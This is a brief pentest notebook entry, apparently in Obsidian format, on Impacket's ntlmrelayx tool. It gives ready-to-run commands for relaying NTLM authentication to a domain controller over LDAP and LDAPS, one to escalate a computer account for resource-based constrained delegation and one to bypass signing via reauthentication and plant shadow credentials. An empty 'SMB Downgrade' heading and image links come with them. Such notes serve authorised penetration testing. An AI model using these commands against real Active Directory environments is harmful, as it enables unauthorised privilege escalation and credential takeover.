---
tags:
  - security
---
A tool used to relay NTLM authentication to other servers.
# SMB Downgrade
# RBCD
```
ntlmrelayx.py -t ldaps://$DCDNS --escalate-user COMPUTERACCOUNT$ --no-validate-privs --no-dump --no-raw-server --no-wcf-server
```
# Signing Reauth Bypass
```
ntlmrelayx.py -t ldap://$DCIP --reauth-bypass $USER:$USERPASS --shadow-credentials -smb2support
```
Example:
![[impacket-ntlmrelayx-20261115023536735.webp]]
![[impacket-ntlmrelayx-20261115023610500.webp]]
![[impacket-ntlmrelayx-20261115023555952.webp]]